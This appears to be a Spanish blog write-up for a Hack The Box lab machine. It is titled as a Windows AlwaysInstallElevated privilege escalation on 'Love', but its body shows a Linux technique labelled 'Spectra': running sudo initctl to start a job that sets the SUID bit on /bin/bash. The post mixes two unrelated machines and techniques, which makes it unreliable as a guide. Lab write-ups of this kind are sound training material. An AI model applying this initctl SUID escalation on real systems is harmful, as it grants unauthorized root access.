---
title: "Love HTB Escalando Privilegio"
layout: post
---
![Love HTB](/assets/images/love.png)

<h2>Presentación</h2>
En esta ocasión no estaré presentando otra escalada de privilegio, de windows y es abusando de: AlwaysInstallElevated, me habia tomado tiempo la preparacion de algunos writeUp, ya que estuve preparandome para el eJPT el cual logramos obtener, tesis, mudanza y otras movidas como seguir con networking y firewall desde EVE-NG, pronto..  🤯.

<h2>WinPEAS</h2>
En la fase de busqueda de privilegias, WinPeas nos presenta el siguiente setting:

![Love HTB Escalando Privilegio ](/assets/images/love-1.png)

<h2>Initctl</h2>


![ Spectra HTB Escalando Privilegio ](/assets/images/Image 2.png)

<h2> ¿Qué hago ahora? </h2>
 

{% highlight bash %} sudo -u root /usr/bin/initctl {% endhighlight %}

![ Spectra HTB Escalando Privilegio ](/assets/images/Image 1.png)

<h2>PoC</h2>


{% highlight bash %}
script
    chmod u+s /bin/bash
end script
{% endhighlight %}

-[+] Guardamos e iniciamos nuestro *test.conf*
 
{% highlight bash %} sudo -u root /usr/bin/initctl start test {% endhighlight %}

-[+] Listamos permisos de la /bin/bash `ls -la /bin/bash`

![ Spectra HTB Escalando Privilegio ](/assets/images/Image 4.png)

🖱️_by:_ *@DaVinciRoot*
